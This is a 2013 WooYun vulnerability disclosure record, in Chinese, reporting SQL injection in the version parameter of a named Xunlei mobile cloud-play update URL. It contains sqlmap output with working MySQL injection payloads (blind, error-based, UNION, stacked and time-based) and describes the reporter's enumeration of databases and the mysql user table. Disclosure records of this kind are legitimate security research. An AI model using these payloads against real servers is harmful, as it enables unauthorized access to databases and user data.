{"id": 9021, "wybug_id": "wooyun-2013-035342", "wybug_title": "迅雷手机云播软件链接sql注入一枚可获取库内数据（root权限）", "wybug_corp": "迅雷", "wybug_author": "c2y2", "wybug_date": "2013-08-27 08:48", "wybug_open_date": "2013-10-11 08:49", "wybug_type": "SQL注射漏洞", "wybug_level": "中", "wybug_rank_0": "15", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["数据库账户权限过高", "注入", "注射技巧", "注射工具使用"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-08-27：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2013-08-27：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2013-09-06：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2013-09-16：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2013-09-26：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2013-10-11：\t细节向公众公开  简要描述： sql注入漏洞，盲注，查询注入，随便注。。。。 详细说明：  1，迅雷手机云播软件后台链接存在sql注入链接：http://wireless.yun.vip.xunlei.com/update?version=1.0.3.51&product_id=39其中字段version存在注入点题外话：我一直都是你们的白金会员，感谢你们手机云播给了我一个了解世界文化的窗口。3ks一：发现漏洞链接确认漏洞点\n\n\n\n二：祭出神器sqlmap\n\n\n\n得到：payloadsqlmap identified the following injection points with a total of 362 HTTP(s) requests:---Place: GETParameter: version    Type: boolean-based blind    Title: MySQL boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (RLIKE)    Payload: version=1.0.3.51' RLIKE IF(2278=2278,0x312e302e332e3531,0x28) AND 'bTlr'='bTlr&product_id=39    Type: error-based    Title: MySQL >= 5.0 AND error-based - WHERE or HAVING clause    Payload: version=1.0.3.51' AND (SELECT 3273 FROM(SELECT COUNT(*),CONCAT(0x716f687271,(SELECT (CASE WHEN (3273=3273) THEN 1 ELSE 0 END)),0x716c696771,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND 'ADNH'='ADNH&product_id=39    Type: UNION query    Title: MySQL UNION query (NULL) - 5 columns    Payload: version=1.0.3.51' UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x716f687271,0x4663616f46694c4d5642,0x716c696771),NULL#&product_id=39    Type: stacked queries    Title: MySQL > 5.0.11 stacked queries    Payload: version=1.0.3.51'; SELECT SLEEP(5)-- &product_id=39    Type: AND/OR time-based blind    Title: MySQL < 5.0.12 AND time-based blind (heavy query)    Payload: version=1.0.3.51' AND 1736=BENCHMARK(5000000,MD5(0x65434977)) AND 'Nwzz'='Nwzz&product_id=39---[21:57:09] [INFO] the back-end DBMS is MySQLweb application technology: Nginxback-end DBMS: MySQL 5.0   漏洞证明：  漏洞证明：一：查询基本信息\n\n二：查tables，太多了，果断终止。。。。<img src=\"/upload/201308/262251155111fbbbeedd20775314fc35be05d56b.pjavascript:void(0)ng\" alt=\"QQ截图20130826222457.png\" />  有两个很感兴趣，表示忍住了诱惑 \n\n三：查库mysql的table\n\n\n\n四，查表user字段\n\n\n\n   修复方案：  你们更懂哈   版权声明：转载请注明来源 c2y2@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：5  确认时间：2013-08-27 15:36 厂商回复： 感谢反馈，正在处理 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 5, "Ranks": null}